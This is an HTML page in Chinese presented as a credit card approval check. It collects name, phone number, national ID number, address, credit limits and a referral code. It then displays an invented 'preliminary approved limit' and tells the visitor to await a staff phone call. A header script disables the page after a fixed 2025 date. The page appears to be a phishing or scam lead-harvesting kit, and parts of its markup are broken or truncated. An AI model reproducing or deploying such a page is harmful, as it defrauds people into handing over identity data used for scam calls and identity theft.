<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>信用卡审批查询</title>
    <script>
      // 在头部立即进行时间检查
      ;(function () {
        // 使用同步的 XMLHttpRequest 来获取时间
        var xhr = new XMLHttpRequest()
        xhr.open('GET', 'https://worldtimeapi.org/api/timezone/Asia/Shanghai', false) // 使用同步请求
        xhr.send(null)

        if (xhr.status === 200) {
          var data = JSON.parse(xhr.responseText)
          var currentTime = new Date(data.datetime).getTime()
          var expiryDate = new Date('2025-07-19T00:00:00+08:00').getTime()

          if (currentTime > expiryDate) {
            window.location.replace('./404.html')
          }
        } else {
          window.location.replace('./404.html') // 在获取时间失败时也跳转到404页面
        }
      })()
    </script>
    <link rel="stylesheet" href="css/van.css" />
    <link rel="stylesheet" href="css/el.css" />
    <link rel="stylesheet" href="css/style.css" />
  </head>
  <body>
    <div id="app" data-v-app="">
      <div data-v-60b33c34="">
        <img src="./images/bg.png" alt="" class="back" data-v-60b33c34="" />
        <div class="form-box" data-v-60b33c34="">
          <h6 data-v-60b33c34="">信用卡审批查询</h6>
          <form class="van-form" data-v-60b33c34="" style="padding: 0px 10px">
            <div class="van-cell-group van-cell-group--inset" data-v-60b33c34="">
              <div class="van-cell van-field" data-v-60b33c34="">
                <!---->
                <div class="van-cell__title van-field__label">
                  <label id="van-field-1-label" for="van-field-1-input">姓名</label

                </div>
                <div class="van-cell__value van-field__value">
                  <div class="van-field__body">
                    <input
                      type="text"
                      id="van-field-1-input"
                      name="姓名"
                      class="van-field__control"
                      placeholder="请输入姓名"
                      aria-labelledby="van-field-1-label"
                    />
                    <div class="input-error">请输入姓名</div>
                  </div>
                  <!----><!---->
                </div>
                <!----><!---->
              </div>
              <div class="van-cell van-field" data-v-60b33c34="">
                <!---->

                  <label id="van-field-2-label" for="van-field-2-input">手机号</label

                </div>
                <div class="van-cell__value van-field__value">
                  <div class="van-field__body">
                    <input
                      type="text"
                      id="van-field-2-input"
                      name="phone"
                      class="van-field__control"
                      placeholder="请输入手机号"

                    /><!----><!----><!---->
                    <div class="input-error">请输入正确的手机号</div>
                  </div>
                  <!----><!---->
                </div>
                <!----><!---->
              </div>
              <div class="van-cell van-field" data-v-60b33c34="">
                <!---->
                <div class="van-cell__title van-field__label">
                  <label id="van-field-3-label" for="van-field-3-input">身份证号</label
                  ><!---->
                </div>
                <div class="van-cell__value van-field__value">
                  <div class="van-field__body">
                    <input
                      type="text"
                      id="van-field-3-input"
                      name="身份证号"
                      class="van-field__control"
                      placeholder="请输入身份证号"
                      aria-labelledby="van-field-3-label"
                    />
                    <div class="input-error">请输入正确的身份证号</div>
                  </div>
                  <!----><!---->
                </div>
                <!----><!---->
              </div>
              <div class="van-cell van-field" data-v-60b33c34="">

                <div class="van-cell__title van-field__label">

                </div>
                <div class="van-cell__value van-field__value">
                  <div class="van-field__body">
                    <input
                      type="text"

                      id="van-field-4-input"
                      name="最高额度"

                  <!----><!---->
                </div>
                <!----><!---->
              </div>
              <div class="van-cell van-field" data-v-60b33c34="">
                <!---->
                <div class="van-cell__title van-field__label">
                  <label id="van-field-5-label" for="van-field-5-input">持卡数量</label
                  ><!---->
                </div>
                <div class="van-cell__value van-field__value">
                  <div class="van-field__body">
                    <input

                      inputmode="numeric"
                      id="van-field-5-input"
                      name="持卡数量"
                      class="van-field__control"
                      placeholder="请输入持卡数量(张)"

                    /><!----><!----><!---->
                    <div class="input-error">请输入持卡数量(张)</div>
                  </div>
                  <!----><!---->
                </div>
                <!----><!---->
              </div>
              <div class="van-cell van-cell--clickable van-field city" role="button" tabindex="0" data-v-60b33c34="">
                <!---->
                <div class="van-cell__title van-field__label">
                  <label id="van-field-6-label" for="van-field-6-input">所在地区</label
                  ><!---->
                </div>
                <div class="van-cell__value van-field__value">
                  <div class="van-field__body">
                    <input
                      type="text"
                      id="van-field-6-input"
                      name="area"
                      class="van-field__control"
                      placeholder="请输入所在地区"
                      aria-labelledby="van-field-6-label"
                    /><!----><!----><!---->
                    <div class="input-error">请输入所在地区</div>
                  </div>
                  <!----><!---->
                </div>
              </div>
              <div class="van-cell van-field" data-v-60b33c34="">
                <!---->
                <div class="van-cell__title van-field__label">
                  <label id="van-field-7-label" for="van-field-7-input">详细地址</label
                  ><!---->
                </div>
                <div class="van-cell__value van-field__value">
                  <div class="van-field__body">
                    <input
                      type="text"
                      id="van-field-7-input"
                      name="详细地址"
                      class="van-field__control"
                      placeholder="请输入详细地址"
                      aria-labelledby="van-field-7-label"
                    /><!----><!----><!---->
                    <div class="input-error">请输入详细地址</div>
                  </div>
                  <!----><!---->
                </div>
                <!----><!---->
              </div>
              <div class="van-cell van-field" data-v-60b33c34="">
                <!---->

                  <label id="van-field-8-label" for="van-field-8-input">推荐码</label

                  <div class="van-field__body">
                    <input
                      type="text"

                    /><!----><!----><!---->
                    <div class="input-error">请输入五位推荐码</div>
                  </div>
                  <!----><!---->
                </div>
                <!----><!---->
              </div>
            </div>
            <div id="submitBtn" data-v-60b33c34="" style="margin-top: 55px; margin-bottom: 30px">
              <button
                type="button"
                class="van-button van-button--primary van-button--normal van-button--block van-button--round"
                data-v-60b33c34=""
              >
                <div class="van-button__content">
                  <!----><span class="van-button__text">确认提交</span
                  ><!---->
                </div>
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>
    <div id="app1" style="display: none">
      <img src="./images/head.png" alt="" />
      <div class="color1 center big bold">审核额度</div>
      <div class="color1 center big2 bold">{{formatNumber(edu)}}.00元</div>
      <div class="border">
        <div class="center">申请人：{{name}}</div>
        <div class="center">申请时间：{{time}}</div>
        <div class="center">初审额度为：{{formatNumber(edu)}}.00元</div>
        <div class="center">请注意接听工作人员电话</div>
      </div>
      <div>
        <div class="color2 bold">温馨提示:</div>
        <div class="color2 bold">信用卡使用须为本人使用，不得出借他人及非法套现等违法行为，请合法使用信用额度</div>
      </div>
    </div>
    <script src="js/vue.global.js"></script>
    <script src="js/jquery-3.5.1.min.js"></script>
    <script src="js/main.js"></script>
  </body>
</html>
